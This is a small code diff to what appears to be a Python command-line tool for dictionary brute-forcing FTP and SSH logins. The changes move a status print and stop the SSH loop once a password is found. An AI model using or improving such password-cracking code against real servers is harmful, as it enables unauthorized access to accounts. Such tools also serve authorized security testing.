@@ -39,9 +39,9 @@ def crack(server, user, passfile):
 	for password in passfile:
 		try:
 			password = password.strip()
-			typer.secho(f"[*] Trying: {password}", fg=typer.colors.GREEN)
 
 			ftp = ftplib.FTP(server)
+			typer.secho(f"[*] Trying: {password}", fg=typer.colors.GREEN)
 			if ftp.login(user, password):
 				typer.secho(f"[*] Password Found: {password}", fg=typer.colors.BRIGHT_GREEN)
 				exit() # TODO: use typer.Exit() or typer.Abort() to exit
@@ -136,6 +136,7 @@ def ssh(
 			response = sshconnect(host, username, password)
 			if response == 0:
 				typer.secho(f"[*] User: {username} [*] Password Found: {password} [*] Login Correct", fg=typer.colors.BRIGHT_GREEN)
+				break
 			elif response == 1:
 				typer.secho(f"[*] User: {username} [*] Password: {password} [!] Login Incorrect", fg=typer.colors.BRIGHT_YELLOW)
 			elif response == 2:
